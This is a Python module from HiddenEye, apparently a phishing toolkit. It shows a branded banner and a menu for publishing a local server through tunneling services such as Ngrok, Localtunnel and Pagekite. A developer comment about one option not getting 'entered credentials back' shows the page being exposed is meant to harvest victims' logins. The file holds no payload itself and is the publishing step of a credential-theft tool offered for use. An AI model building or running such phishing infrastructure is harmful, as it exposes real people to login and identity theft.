#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#


from Defs.ImportManager.unsorted_will_be_replaced import run_command
import Defs.ThemeManager.theme as theme
import Defs.ActionManager.Server.server_runner as server_runner

default_palette = theme.default_palette







def server_selection(port):  # Question where user must select server
    run_command('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
    print(
        "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(default_palette[0], default_palette[4]))
    print("\n {0}[{1}0{0}]{1}LOCALHOST \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo {0}(Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel \n {0}[{1}5{0}]{1}OpenPort\n {0}[{1}6{0}]{1}Pagekite\n".format(default_palette[0], default_palette[2]))

    choice = input(" \n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
    if choice == '0':
        run_command('clear')
        server_runner.start_localhost(port) #FIXED
    elif choice == '1':
        run_command('clear')
        server_runner.start_ngrok(port) # FIXED
    elif choice == '2':
        run_command('clear')
        server_runner.start_serveo(port) # ALMOST FIXED
    elif choice == '3':
        run_command('clear')
        server_runner.start_localxpose(port) # DOESN'T GET ENTERED CREDENTIALS BACK
    elif choice == '4':
        run_command('clear')
        server_runner.start_localtunnel(port, True)
    elif choice == '5':
        run_command('clear')
        server_runner.start_openport(port)
    elif choice == '6':
        run_command('clear')
        server_runner.start_pagekite(port)
    else:
        run_command('clear')
        return server_selection(port)
